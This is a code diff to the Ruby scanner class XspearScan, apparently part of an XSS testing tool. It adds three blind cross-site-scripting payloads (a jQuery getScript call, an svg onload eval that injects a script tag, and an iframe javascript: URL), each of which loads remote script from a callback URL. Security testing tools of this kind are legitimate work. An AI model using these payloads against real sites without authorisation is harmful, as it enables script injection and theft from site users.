@@ -371,7 +371,9 @@ class XspearScan
     # Check Blind XSS Payload
     if !@blind_url.nil?
       r.push makeQueryPattern('f', "\"'><script src=#{@blind_url}></script>", "NOTDETECTED", 'i', "", CallbackNotAdded)
-
+      r.push makeQueryPattern('f', "\"'><script>$.getScript('#{@blind_url}')</script>", "NOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><svg onload=javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'#{@blind_url}\';d.body.appendChild(_)')>", "NOTDETECTED", 'i', "", CallbackNotAdded)
+      r.push makeQueryPattern('f', "\"'><iframe src=javascript:$.getScript('#{@blind_url}')></iframe>", "NOTDETECTED", 'i', "", CallbackNotAdded)
     end
 
     r = r.flatten
